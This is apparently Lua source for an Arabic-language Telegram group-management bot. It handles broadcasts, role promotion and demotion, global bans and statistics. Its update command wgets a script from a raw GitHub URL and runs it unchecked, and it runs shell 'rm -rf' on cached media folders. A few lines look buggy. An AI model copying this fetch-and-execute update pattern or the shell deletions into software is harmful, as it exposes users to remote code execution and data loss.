if text == 'اذاعه خاص بالرد' and tonumber(msg.reply_to_message_id_) > 0 and is_devtaha(msg) then function cb(a,b,c) local text = b.content_.text_ local list = tahadevstorm:smembers(DEVSTOR..'usersbot') for k,v in pairs(list) do rempv(v) storm_sendMsg(v, 0, 1, text,1, 'html') end local pv = tahadevstorm:scard(DEVSTOR.."usersbot")      local text = '📬*¦* تم ارسال رسالتك الى *{'..pv..'}* مشتركين' storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md') end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),cb) end
if text == 'اذاعه بالرد' and tonumber(msg.reply_to_message_id_) > 0 and is_devtaha(msg) then function cb(a,b,c) local text = b.content_.text_ local list = tahadevstorm:smembers(DEVSTOR..'bot:gpsby:id') for k,v in pairs(list) do storm_sendMsg(v, 0, 1, text,1, 'html') end local grp = tahadevstorm:scard(DEVSTOR.."bot:gpsby:id")       local text = '📇*¦* تم ارسال رسالتك الى *{'..grp..'}* مجموعات'  storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')  end  getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),cb)  end
if text == 'اذاعه للكل بالرد' and tonumber(msg.reply_to_message_id_) > 0 and is_devtaha(msg) then function cb(a,b,c) local text = b.content_.text_ local list = tahadevstorm:smembers(DEVSTOR..'usersbot') for k,v in pairs(list)  do rempv(v) storm_sendMsg(v, 0, 1, text,1, 'html') end local text = b.content_.text_ local list = tahadevstorm:smembers(DEVSTOR..'botgps') for k,v in pairs(list) do storm_sendMsg(v, 0, 1, text,1, 'md') end local grp = tahadevstorm:scard(DEVSTOR.."botgps")  local pv = tahadevstorm:scard(DEVSTOR.."usersbot")          local text = '📮*¦* تم ارسالها الى *{'..pv..'}* مشتركين\n📇*¦* وتم ارسالها الى *{ '..grp..' }* مجموعات' storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md') end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),cb) end end
if text == 'رفع مطور' and is_devtaha(msg) then function sudo_reply(extra, result, success) tahadevstorm:sadd(DEVSTOR..'sudo:bot',result.sender_user_id_) tahadevstorm:srem(DEVSTOR..'moder'..result.chat_id_,result.sender_user_id_)    zo = '*◗📛¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗💠¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📬¦* تـم ترقيتـه مطـور البـوت' storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md') end if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then else getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply) end end
if text and is_sudo(msg) and text:match('^رفع مطور (%d+)') and is_devtaha(msg) then  local user = text:match('رفع مطور (%d+)') function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..'' tahadevstorm:sadd(DEVSTOR..'sudo:bot',user) zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تـم ترقيتـه مطـور البـوت' storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md') end getUser(user, bot_kick) end
if text and text:match('^رفع مطور @(.*)') and is_devtaha(msg) then     local username = text:match('^رفع مطور @(.*)')  function setsudo(extra,result,success)   if result.id_ then   tahadevstorm:sadd(DEVSTOR..'sudo:bot',result.id_) tahadevstorm:srem(DEVSTOR..'moder'..msg.chat_id_,user)  zo = '*◗📛¦* العضــو { [@'..username..'] }\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تـم ترقيتـه مطـور البـوت '    else    ze = ' ◗♻¦ حاول مره اخره لو سمحت '   end      storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')    end    saddbyusername(username,setsudo)  end 
if text and text:match('^تنزيل مطور @(.*)') and is_devtaha(msg) then     local username = text:match('^تنزيل مطور @(.*)')  function vippyuser(extra,result,success)   if result.id_ then  tahadevstorm:srem(DEVSTOR..'sudo:bot',result.id_) zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تـم تـنزيلـه مـن المطـوريـن'    else    ze = ' ◗♻¦ حاول مره اخره لو سمحت '     end     storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')    end    saddbyusername(username,vippyuser)  end
if text == 'تنزيل مطور' and is_devtaha(msg) then function sudo_reply(extra, result, success)  tahadevstorm:srem(DEVSTOR..'sudo:bot',result.sender_user_id_) local user = result.sender_user_id_  zo = '*◗📛¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗💠¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📬¦* تـم تـنزيلـه مـن المطـوريـن' storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md') end if tonumber(msg.reply_to_message_id_) == 0 then else getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)   end end
if text and text:match('^تنزيل مطور (%d+)') and is_devtaha(msg) then local user = text:match('تنزيل مطور (%d+)') function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..'' tahadevstorm:srem(DEVSTOR..'sudo:bot',user) zo = '*◗📛¦* العضــو [ @'..username..' ]\n◗💠¦ الايــدي { '..user..' }\n*◗📬¦* تـم تـنزيلـه مـن المطـوريـن'  storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md') end getUser(user, bot_kick) end end if is_mod(msg) then
if text == "تحديث السورس" and is_devtaha(msg) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, '♻ • جاري تحديث السورس • ♻', 1, 'md') os.execute('rm -rf STORM.lua') os.execute('wget https://raw.githubusercontent.com/NOVAR1/STORM/master/STORM.lua') sleep(0.5) storm_sendMsg(msg.chat_id_, msg.id_, 1, '🚸*¦* تم تحديث ♻ السورس ✔ ', 1, 'md') dofile('STORM.lua')  io.popen("rm -rf ~/.telegram-cli/data/audio/*") io.popen("rm -rf ~/.telegram-cli/data/document/*") io.popen("rm -rf ~/.telegram-cli/data/photo/*") io.popen("rm -rf ~/.telegram-cli/data/sticker/*") io.popen("rm -rf ~/.telegram-cli/data/temp/*") io.popen("rm -rf ~/.telegram-cli/data/thumb/*") io.popen("rm -rf ~/.telegram-cli/data/video/*") io.popen("rm -rf ~/.telegram-cli/data/voice/*") io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") end
if text == 'حظر عام' and is_devtaha(msg)   then if msg.reply_to_message_id_ == 0 then local user = msg.sender_user_id_ else function banreply(extra, result, success) banall(msg,msg.chat_id_,result.sender_user_id_) end end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),banreply) end
if text and text:match('^حظر عام @(.*)') and is_devtaha(msg)   then local username = text:match('حظر عام @(.*)') function banusername(extra,result,success) if result.id_ then   if tonumber(result.id_) == tonumber(bot_id) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر البوت 💢*\n', 1, 'md')  return false  end if storm1(msg.chat_id_,result.id_) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع حظر وكتم وطرد وتقيد ال(مدراء او الادمنيه او المميزين) 💢*\n', 1, 'md') else  changeChatMemberStatus(msg.chat_id_, result.id_, "Kicked") tahadevstorm:sadd(DEVSTOR..'storm:gbaned',result.id_)   zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تـم  حظـره عـام فـي البـوت '     end  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md')  end end saddbyusername(username,banusername) end
if text and text:match('^حظر عام (%d+)') and is_devtaha(msg)  then local user = text:match('حظر عام (%d+)')  function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..'' if tonumber(user) == tonumber(bot_id) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')  return false  end if storm1(msg.chat_id_,user) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع حظر وكتم وطرد وتقيد ال(مدراء او الادمنيه او المميزين) 💢*', 1, 'md') return false  end  changeChatMemberStatus(msg.chat_id_, user, "Kicked") tahadevstorm:sadd(DEVSTOR..'storm:gbaned',user)  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تـم حظـره عـام فـي البـوت ' storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md') end  getUser(user, bot_kick) end 
if text == 'الغاء العام' and is_devtaha(msg) then if msg.reply_to_message_id_ == 0 then local user = msg.sender_user_id_ else function unbanreply(extra, result, success) unbanall(msg,msg.chat_id_,result.sender_user_id_) end end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) end	
if text and text:match('^الغاء العام (%d+)') and is_devtaha(msg) then  local user = text:match('الغاء العام (%d+)') function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..'' tahadevstorm:srem(DEVSTOR..'storm:gbaned',user) zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تـم الغـاء حظـره عـام '   storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md') end getUser(user, bot_kick) end
if text and text:match('^الغاء العام @(.*)') and is_devtaha(msg) then local username = text:match('الغاء العام @(.*)') function unbanusername(extra,result,success) if result.id_ then tahadevstorm:srem(DEVSTOR..'storm:gbaned',result.id_)  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تـم الغـاء حظـره عـام '  else ze = ' ◗♻¦ حاول مره اخره لو سمحت '     end  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md')  end saddbyusername(username,unbanusername) end
if text == 'قائمه العام' and is_sudo(msg) then local list = tahadevstorm:smembers(DEVSTOR..'storm:gbaned') local  t = '*📃¦ قائمه المحظورين عام 🍃*\nــــــــــــــــــــــــــــــــــــــــــــــــــــــــ\n' for k, v in pairs(list) do if tahadevstorm:hget('users:'..v, 'uname') then  t = t..'*◖'..k.."◗➣* [" ..get_username(v).."]\n"  else  t = t..'*◖'..k.."◗➣* `" ..(v).."`\n"  end  end if #list == 0 then t = '*❌¦* لا يوجد اعضاء محظورين عام' end storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') end
if text == 'مسح قائمه العام' and is_devtaha(msg) then tahadevstorm:del(DEVSTOR..'storm:gbaned') storm_sendMsg(msg.chat_id_, msg.id_, 1,'*📛¦* تم مسح قائمه المحظورين عام ', 1, 'md') end	 
if text == 'تحديث' and is_devtaha(msg) then  dofile('STORM.lua')  io.popen("rm -rf ~/.telegram-cli/data/audio/*") io.popen("rm -rf ~/.telegram-cli/data/document/*") io.popen("rm -rf ~/.telegram-cli/data/photo/*") io.popen("rm -rf ~/.telegram-cli/data/sticker/*") io.popen("rm -rf ~/.telegram-cli/data/temp/*") io.popen("rm -rf ~/.telegram-cli/data/thumb/*") io.popen("rm -rf ~/.telegram-cli/data/video/*") io.popen("rm -rf ~/.telegram-cli/data/voice/*") io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*")  print("\27[31;47m\n          💥»» تم تحديث البوت ««💥          \n\27[0;34;49m\n") storm_sendMsg(msg.chat_id_, msg.id_, 1, '*📛¦* تم تحديث البوت', 1, 'md') end 
if text == 'الاحصائيات' and is_devtaha(msg) then  local grall = tahadevstorm:scard(DEVSTOR.."botgps") or 0  local gradd = tahadevstorm:scard(DEVSTOR..'bot:gpsby:id') or 0  local uspv = tahadevstorm:scard(DEVSTOR.."usersbot") or 0  storm_sendMsg(msg.chat_id_, msg.id_, 1,'\n*📊¦ عدد الكروبات الكلي ◗'..grall..'◖*\n*🚸¦ عدد الكروبات المفعله ◗'..gradd..'◖*\n*🚨¦ الكروبات الغير مفعله ◗'..(grall - gradd)..'◖*\n*📛¦ عدد المشتركين ◗'..uspv..'◖*', 1, 'md') end
if text == 'مسح المشتركين' and is_devtaha(msg) then   local list = tahadevstorm:smembers(DEVSTOR..'usersbot')   for k,v in pairs(list) do    rempv(v) tahadevstorm:srem(DEVSTOR..'usersbot',v)  end   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*🎲¦ تم مسح المشتركين *\n', 1, 'md') end  if chat_type == 'super' then
if tahadevstorm:get(DEVSTOR.."add:bot:group"..msg.chat_id_)  then
if text == 'غادر' and is_sudo(msg) then tahadevstorm:srem(DEVSTOR.."addgrop", msg.chat_id_) tahadevstorm:del(DEVSTOR.."add:bot:group"..msg.chat_id_, true) rem_group(msg.chat_id_)  rem_lockal(msg.chat_id_) tahadevstorm:del(DEVSTOR.."test:group"..msg.chat_id_)   tahadevstorm:del(DEVSTOR..'moder'..msg.chat_id_) tahadevstorm:del(DEVSTOR..'modergroup'..msg.chat_id_) tahadevstorm:del(DEVSTOR..'mods:'..msg.chat_id_) tahadevstorm:del(DEVSTOR.."add:bot:group"..msg.chat_id_, true) tahadevstorm:srem(DEVSTOR..'bot:gpsby:id', msg.chat_id_)  tahadevstorm:srem(DEVSTOR.."botgps", msg.chat_id_)   changeChatMemberStatus(msg.chat_id_, bot_id, "Left") storm_sendMsg(msg.chat_id_, msg.id_, 1, '💥*¦*  تم مغادرة المجموعه ', 1, 'md') end
if text and text:match("^(رفع منشئ) (-%d+) @(.*)") and is_sudo(msg) then   local matches = {text:match("^(رفع منشئ) (-%d+) @(.*)")}   function promreply(extra,result,success)   if result.id_ then   if #matches == 3 then   tahadevstorm:sadd(DEVSTOR..'moder'..matches[2],result.id_)    zo = '\n*◗💠¦ العضو { @'..matches[3]..' }*\n*◗📬¦* تـم تـرقيتـه منشـئ للـكروب\n*◗📛¦* في هاذا المجموعه'..(matches[2])..''  storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')     end   end  end  saddbyusername(matches[3],promreply)   end
if text and text:match("^(رفع منشئ) (-%d+) (%d+)") and is_sudo(msg) then   local matches = {text:match("^(رفع منشئ) (-%d+) (%d+)")}   if #matches == 3 then   tahadevstorm:sadd(DEVSTOR..'moder'..matches[2],matches[3])    zo = '\n*◗💠¦ العضو { '..matches[3]..' }*\n*◗📬¦* تـم تـرقيتـه منشـئ للـكروب\n*◗📛¦* في هاذا المجموعه'..(matches[2])..''  storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')     end   end
if text == 'رفع منشئ' and is_sudo(msg) then function prom_reply(extra, result, success) monsh(msg,msg.chat_id_,result.sender_user_id_)  end if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then else getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply) end end
if text and text:match('^رفع منشئ @(.*)') and is_sudo(msg) then local username = text:match('^رفع منشئ @(.*)') function promreply(extra,result,success) if result.id_ then tahadevstorm:sadd(DEVSTOR..'moder'..msg.chat_id_,result.id_) zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تـم تـرقيتـه منشـئ للـكروب' else  ze = ' ◗♻¦ حاول مره اخره لو سمحت ' end storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md')  end saddbyusername(username,promreply) end
if text and text:match('^رفع منشئ (%d+)') and is_sudo(msg) then local user = text:match('رفع منشئ (%d+)') function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..'' tahadevstorm:sadd(DEVSTOR..'moder'..msg.chat_id_,user)  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تـم تـرقيتـه منشـئ للـكروب'  storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')   end getUser(user, bot_kick) end
if text == 'تنزيل منشئ' and is_sudo(msg) then function prom_reply(extra, result, success) demmonsh(msg,msg.chat_id_,result.sender_user_id_) end if tonumber(msg.reply_to_message_id_) == 0 then else getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)   end end
if text and text:match('^تنزيل منشئ @(.*)') and is_sudo(msg) then  local username = text:match('^تنزيل منشئ @(.*)') function demreply(extra,result,success)   if result.id_ then  tahadevstorm:srem(DEVSTOR..'moder'..msg.chat_id_,result.id_)  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تـم تـنزيلـه مـن المنشئـين' else  ze = ' ◗♻¦ حاول مره اخره لو سمحت ' end  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md')  end  saddbyusername(username,demreply) end
if text and text:match('^تنزيل منشئ (%d+)') and is_sudo(msg) then local user = text:match('تنزيل منشئ (%d+)') function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..'' tahadevstorm:srem(DEVSTOR..'moder'..msg.chat_id_,user)  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تـم تـنزيلـه مـن المنشئـين' storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md') end getUser(user, bot_kick) end
if text ==('المنشئين') and is_owner(msg) then  local list = tahadevstorm:smembers(DEVSTOR..'moder'..msg.chat_id_) local  t = '*📊¦ قائمه منشئين المجموعه 🍂 *\nـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ\n' for k, v in pairs(list) do if tahadevstorm:hget('users:'..v, 'uname') then t = t..'*◖'..k.."◗➣* [" ..get_username(v).."]\n"  else  t = t..'*◖'..k.."◗➣* `" ..(v).."`\n" end  end if #list == 0 then t = '💥*¦*  لا يوجد منشئين هنا' end storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') end
if text == 'مسح المنشئين' and is_sudo(msg) then tahadevstorm:del(DEVSTOR..'moder'..msg.chat_id_) storm_sendMsg(msg.chat_id_, msg.id_, 1,'💥*¦*  تم مسح المنشئين بنجاح ✔', 1, 'md') end end
if text == 'مسح المطورين' and is_devtaha(msg) then   local list = tahadevstorm:smembers(DEVSTOR..'sudo:bot') for k,v in pairs(list) do  tahadevstorm:srem(DEVSTOR..v,'sudo:bot') tahadevstorm:del(DEVSTOR.."sudo:") tahadevstorm:del(DEVSTOR..'sudo:bot')  end storm_sendMsg(msg.chat_id_, msg.id_, 1,'✔*¦* تم مسح جميع المطورين', 1, 'md')   end
if text == 'مسح المميزين عام' and is_devtaha(msg) then    local list = tahadevstorm:smembers(DEVSTOR..'vip:groups')  for k,v in pairs(list) do  tahadevstorm:del(DEVSTOR..v,'vip:groups')  tahadevstorm:del(DEVSTOR.."vip:groups")  tahadevstorm:del(DEVSTOR..'vip:groups')   end storm_sendMsg(msg.chat_id_, msg.id_, 1,'🚸*¦* تم مسح جميع المميزين عام', 1, 'md')   end
if text == 'مسح المقيدين' and is_mod(msg) then     local list = tahadevstorm:smembers(DEVSTOR..'tedmembars'..msg.chat_id_) for k,v in pairs(list) do   tahadevstorm:del(DEVSTOR..'tedmembars'..msg.chat_id_) HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..v.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") tahadevstorm:srem(DEVSTOR.."keed", msg.chat_id_)  end storm_sendMsg(msg.chat_id_, msg.id_, 1,'🚸*¦* تم مسح المقيدين', 1, 'md')   end
if text and text:match('^ايدي @(.*)') then local username = text:match('^ايدي @(.*)') function id_by_username(extra,result,success) local msgss = tonumber(tahadevstorm:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..result.id_) or 0) local msgtaha = 357 local msggstaha = tahadevstorm:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..result.id_) or 0  local nupmsgg =  tonumber((msggstaha / msgtaha) * 100)   local  tahah = 1  for k,v in pairs(tahadevstorm:hkeys("user:messages"..msg.chat_id_..":*")) do  if tahadevstorm:get(DEVSTOR.."user:messages"..msg.chat_id_":"..v) > tahah then  tahah = tahadevstorm:get(DEVSTOR.."user:messages"..msg.chat_id_":"..v)  end end if result.id_ then  text = '\n🚸*¦ ايديه ◗ '..result.id_..' ◖*\n📇*¦ رسايله ◗ '..(tahadevstorm:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..result.id_) or 0)..'* ◖\n📊*¦* تفاعله ◗ '..formsgg(msgss)..' ◖\n🚨*¦* معرفه ◗[ '..get_username(result.id_)..' ]◖\n📛*¦* اسمه ◗ `'..get_name(result.id_)..'` ◖' else   text = '' end storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md') end saddbyusername(username,id_by_username) end
if text and text:match('الحساب (%d+)') then local idtaha = text:match('الحساب (%d+)')  local taha = {'اضغط هنا للدخول الى حساب الصاك 😍'} tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=taha[math.random(#taha)], disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=30, user_id_=idtaha}}}}, dl_cb, nil) end
if text and text:match("^كول (.+)") and not text:match("^كول @(.+)")  and not text:match("^كول [Tt].[Mm][Ee](.+)")  and not text:match("^كول [Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/(.+)") and not text:match("^كول [Hh][Tt][Tt][Pp][Ss]://(.+)") and not text:match("^كول [Hh][Tt][Tt][Pp]://(.+)")  and not text:match("^كول [Ww][Ww][Ww].(.+)") and not text:match("^كول (.+).[Cc][Oo][Mm]")  and  is_mod(msg) then  local taha =  text:match("^كول (.+)")  storm_sendMsg(msg.chat_id_, msg.id_, 1,'`'..taha..'`', 1, 'md') end end
if text == 'تحديث السيرفر' and is_devtaha(msg) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '🚸*¦* جاري تحديث السيرفر ♻', 1, 'md')  sleep(2) storm_sendMsg(msg.chat_id_, msg.id_, 1, '✔*¦* تم تحديث السيرفر ♻ وعمل رن ب screen ', 1, 'md')  io.popen('cd $home && cd STORM && chmod +x tg && chmod +x STORM.sh && screen -S -X  ./STORM.sh'):read("*all") end
if text == 'الكروبات' and is_sudo(msg) then local addgrop = tahadevstorm:scard(DEVSTOR.."botgps")  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*📊¦ عدد الكروبات الكلي ◗ '..addgrop..' ◖*', 1, 'md') end end
if text == 'المشتركين' and is_sudo(msg) then      local addgrop = tahadevstorm:scard(DEVSTOR.."usersbot") or 0    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*🚸¦ عدد المشتركين في البوت ◗'..addgrop..'◖*', 1, 'md')    end      if chat_type == 'super' then
if text == 'مسح المجموعات' and is_devtaha(msg) then local lgp = tahadevstorm:smembers(DEVSTOR.."bot:gpsby:id") local lsug = tahadevstorm:smembers(DEVSTOR.."botgps") local lgpn = tahadevstorm:scard(DEVSTOR.."bot:gpsby:id") local lsugn = tahadevstorm:scard(DEVSTOR.."botgps") for k,v in pairs(lgp) do tahadevstorm:srem(DEVSTOR..'bot:gpsby:id', v) tahadevstorm:srem(DEVSTOR.."botgps", v) rem_group(v)  rem_lockal(v) tahadevstorm:del(DEVSTOR.."add:bot:group"..v, true) tahadevstorm:del(DEVSTOR.."test:group"..v)   tahadevstorm:del(DEVSTOR..'moder'..v) tahadevstorm:del(DEVSTOR..'modergroup'..v) tahadevstorm:del(DEVSTOR..'mods:'..v)  changeChatMemberStatus(v, bot_id, "Left")  end for k,v in pairs(lsug) do  tahadevstorm:srem(DEVSTOR..'bot:gpsby:id', v) tahadevstorm:srem(DEVSTOR.."botgps", v) rem_group(v)  rem_lockal(v) tahadevstorm:del(DEVSTOR.."test:group"..v)  tahadevstorm:del(DEVSTOR.."add:bot:group"..v, true) tahadevstorm:del(DEVSTOR..'moder'..v) tahadevstorm:del(DEVSTOR..'modergroup'..v) tahadevstorm:del(DEVSTOR..'mods:'..v) changeChatMemberStatus(v, bot_id, "Left") end storm_sendMsg(msg.chat_id_, msg.id_, 1,"📬*¦* تم مغادره *{"..lsugn.."}* مجموعه\n", 1, 'md') end
if text == 'رفع الادمنيه' and is_monsh(msg) then  local function cb(extra,result,success) local moder = result.members_   for i = 0 , #moder do   if tahadevstorm:sismember(DEVSTOR..'mods:'..msg.chat_id_,moder[i].user_id_) then   else tahadevstorm:sadd(DEVSTOR..'mods:'..msg.chat_id_,moder[i].user_id_) end  end end   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*📛¦* تم رفع الادمنيه في البوت *{ ارسل الادمنيه لعرضهم }*\n', 1, 'md') chek_admin(msg.chat_id_,cb)   end 
if text == 'رفع المدير' and is_sudo(msg) then  function gpinfo(arg,data)   local function cb(extra,result,success)  local moder = result.members_    for i = data.administrator_count_ - 1 , #moder do   if tahadevstorm:sismember(DEVSTOR..'moder'..msg.chat_id_,moder[i].user_id_) then  else tahadevstorm:sadd(DEVSTOR..'moder'..msg.chat_id_,moder[i].user_id_) end  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*📛¦* تم ترقيتة منشئ الكروب في البوت معرفه *{* ['..get_username(moder[i].user_id_)..'] *}*', 1, 'md')   end end  chek_admin(msg.chat_id_,cb) end getChannelFull(msg.chat_id_, gpinfo, nil) end   if chat_type == 'super' then
if text and text:match('^ضع اسم (.*)') and is_owner(msg) then local name = text:match('^ضع اسم (.*)') changeChatTitle(msg.chat_id_, name) end
if text ==('رفع مدير') and is_owner(msg) then function prom_reply(extra, result, success) moder(msg,msg.chat_id_,result.sender_user_id_) end if tonumber(msg.reply_to_message_id_) == 0 then else getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)   end end
if text and text:match('^رفع مدير @(.*)') and is_owner(msg) then local username = text:match('^رفع مدير @(.*)') function promreply(extra,result,success) if result.id_ then  tahadevstorm:sadd(DEVSTOR..'modergroup'..msg.chat_id_,result.id_) zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تـم تـرقيتـه مدير للـكروب' else  ze = ' ◗♻¦ حاول مره اخره لو سمحت '  end   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md')   end saddbyusername(username,promreply) end
if text and text:match('^رفع مدير (%d+)') and is_owner(msg) then local user = text:match('رفع مدير (%d+)') function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..'' tahadevstorm:sadd(DEVSTOR..'modergroup'..msg.chat_id_,user)  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تـم تـرقيتـه مدير للـكروب'  end storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')   getUser(user, bot_kick) end
if text ==('تنزيل مدير') and is_owner(msg) then function prom_reply(extra, result, success) demmoder(msg,msg.chat_id_,result.sender_user_id_) end if tonumber(msg.reply_to_message_id_) == 0 then else getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)   end end
if text and text:match('^تنزيل مدير @(.*)') and is_owner(msg) then local username = text:match('^تنزيل مدير @(.*)') function promreply(extra,result,success) if result.id_ then  tahadevstorm:srem(DEVSTOR..'modergroup'..msg.chat_id_,result.id_)  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تـم تـنزيلـه مـن الاداره' else  ze = ' ◗♻¦ حاول مره اخره لو سمحت '  end     storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md')  end saddbyusername(username,promreply) end
if text and text:match('^تنزيل مدير (%d+)') and is_owner(msg) then local user = text:match('تنزيل مدير (%d+)') function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''  tahadevstorm:srem(DEVSTOR..'modergroup'..msg.chat_id_,user) zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تـم تـنزيلـه مـن الاداره' storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')   end   getUser(user, bot_kick) end
if text ==('المدراء') and is_mod(msg) then local list = tahadevstorm:smembers(DEVSTOR..'modergroup'..msg.chat_id_) local t = '*📊¦ قائمه مدراء المجموعه ✨*\n*ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n' for k, v in pairs(list) do if tahadevstorm:hget('users:'..v, 'uname') then t = t..'*◖'..k.."◗➣* [" ..get_username(v).."]\n"  else  t = t..'*◖'..k.."◗➣* `" ..(v).."`\n" end  end if #list == 0 then t = '*📬¦* لا يوجد مدراء في المجموعه' end storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') end
if text ==('مسح المدراء') and is_owner(msg) then tahadevstorm:del(DEVSTOR..'modergroup'..msg.chat_id_) storm_sendMsg(msg.chat_id_, msg.id_, 1,'*📬¦* تم مسح مدراء البوت', 1, 'md') end 
if text=="ضع رابط" and msg.reply_to_message_id_ == 0  and is_mod(msg) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* حسناا ارسل لي رابط المجموعه ", 1, 'md')       tahadevstorm:set(DEVSTOR.."link:group"..msg.chat_id_, 'setlinkwai') end
